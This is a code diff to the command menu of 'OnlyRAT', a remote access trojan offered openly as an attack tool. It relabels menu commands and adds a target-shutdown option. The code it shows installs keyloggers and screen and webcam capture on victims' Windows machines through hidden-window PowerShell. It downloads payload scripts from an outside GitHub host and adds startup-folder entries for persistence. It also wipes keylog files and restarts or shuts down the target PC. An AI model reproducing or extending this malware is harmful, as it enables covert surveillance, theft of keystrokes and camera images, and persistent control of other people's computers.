@@ -20,8 +20,11 @@ banner = """
 #+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
 ########  ###    #### ########## ###    ###    ### ###     ### ###  
 
-            [::] The Only RAT You'll Ever Need [::]
-                [::] Created By : Blue Cosmo [::]
+
+              _..----.._    _       
+            .'  .--.    "-.(0)_     [::] The Only RAT You'll Ever Need [::]
+'-.__.-'"'=:|   ,  _)_ \\__ . c\\'-.. 
+             '''------'---''---'-"  [::] Created By : Blue Cosmo [::]
 """
 
 # help menu
@@ -35,25 +38,28 @@ help_menu = """
 
 # option menu
 options_menu = """
-        [+] Payloads:
-            [0] - Remote Console
-            [1] - Install Keylogger
-            [2] - Grab Keylogs
-            [3] - Install ScreenCapture
-            [4] - Grab ScreenShots 
-            [5] - Upload File 
-            [6] - Download File
-            [7] - Restart Target PC
-            [8] - Install WebCam Capture
-            [9] - Grab WebCam Pictures
+        [+] Command and Control:
+            [orconsole] -- Remote Console
+            [upload] ----- Upload File 
+            [downlaod] --- Download File
+            [restart] ---- Restart Target PC
+            [shutdown] --- Shutdown Target PC
+
+        [+] Reconnaissance:
+            [install keylogger] ------ Install Keylogger
+            [install screencapture] -- Install ScreenCapture
+            [install webcam] --------- Install WebCam Capture
+            [grab keylogs] ----------- Grab Keylogs
+            [grab screenshots] ------- Grab ScreenShots From ScreenCapture
+            [grab webcam] ------------ Grab WebCam Photos
 
         [+] Options:
-            [h] or [help] ----- Help Menu
-            [c] or [config] --- Display RAT File
-            [v] or [version] -- Version Number
-            [u] or [update] --- Update OnlyRAT
-            [r] or [remove] --- Remove OnlyRAT
-            [q] or [quit] ----- Quit
+            [help] ----- Help Menu
+            [config] --- Display RAT File
+            [version] -- Version Number
+            [update] --- Update OnlyRAT
+            [remove] --- Remove OnlyRAT
+            [quit] ----- Quit
 
             * any other commands will be 
               sent through your terminal
@@ -305,9 +311,7 @@ def cli(arguments):
 
     # if arguments exist
     if arguments:
-
-        # display options
-        print(options_menu)
+        print("\t[~] Type \"help\" for help menu :\n")
 
         # loop user input
         while True:
@@ -331,15 +335,15 @@ def cli(arguments):
             target_username = working_direcory[9:-19]
 
             # remote console
-            if option == "0":
+            if option == "orconsole":
                 connect(ipv4, password)
 
             # keylogger option
-            elif option == "1":
+            elif option == "install keylogger":
                 keylogger(ipv4, password, target_username, working_direcory)
             
             # grab keylogs option
-            elif option == "2":
+            elif option == "grab keylogs":
                 remote_download(ipv4, password, f"{working_direcory}/{target_username}.log")
                 remote_command(ipv4, password, f"powershell New-Item -Path {working_direcory}/{target_username}.log -ItemType File -Force")
 
@@ -347,7 +351,7 @@ def cli(arguments):
                 print("[+] Log file on target has been wiped\n")
 
             # installs screen capture option
-            elif option == "3":
+            elif option == "install screencapture":
                 print("\n[*] Installing screen capture...")
                 install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
                 add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1 >> GiLqXiexKP.cmd"
@@ -358,24 +362,28 @@ def cli(arguments):
                 print("[+] ScreenCapture installed\n")
                 print("\n[!] Restart target computer to execute\n")
 
-            # take screenshot option
-            elif option == "4":
+            # grab screenshots option
+            elif option == "grab screenshots":
                 grab_screenshots(ipv4, password, working_direcory, target_username)
 
             # custom upload
-            elif option == "5":
+            elif option == "upload":
                 upload(ipv4, password, working_direcory)
 
             # custom download
-            elif option == "6":
+            elif option == "download":
                 download(ipv4, password)
 
             # restart target option
-            elif option == "7":
+            elif option == "restart":
                 remote_command(ipv4, password, "shutdown /r")
+                
+            # shutdown target option
+            elif option == "shutdown":
+                remote_command(ipv4, password, "shutdown")
 
             # install webcam option
-            elif option == "8":
+            elif option == "install webcam":
                 print("\n[*] Installing webcam capture...")
 
                 install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
@@ -387,34 +395,35 @@ def cli(arguments):
                 print("[+] Webcam capture installed\n")
                 print("\n[!] Restart target computer to execute\n")
             
-            # grab keylogs
-            elif option == "9":
+            # grab webcam photos
+            elif option == "grab webcam":
                 grab_webcam(ipv4, password, working_direcory, target_username)
 
             # help menu
-            elif option == "h" or option == "help":
-                main()
+            elif option == "help":
+                print(banner)
+                print(options_menu)
 
             # display config file info
-            elif option == "c" or option == "config":
+            elif option == "config":
                 print_config(configuration)
                 print(f"USERNAME : {target_username}")
             
             # get version number
-            elif option == "v" or option == "version":
+            elif option == "version":
                 os.system(f"cat {local_path}/version.txt")
 
             # update option
-            elif option == "u" or option == "update":
+            elif option == "update":
                 update()
                 exit()
 
             # remove installation
-            elif option == "r" or option == "remove" or option == "uninstall":
+            elif option == "remove" or option == "uninstall":
                 remove()
 
             # quit option
-            elif option == "q" or option == "quit" or option == "exit":
+            elif option == "quit" or option == "exit":
                 exit()
 
             # exception
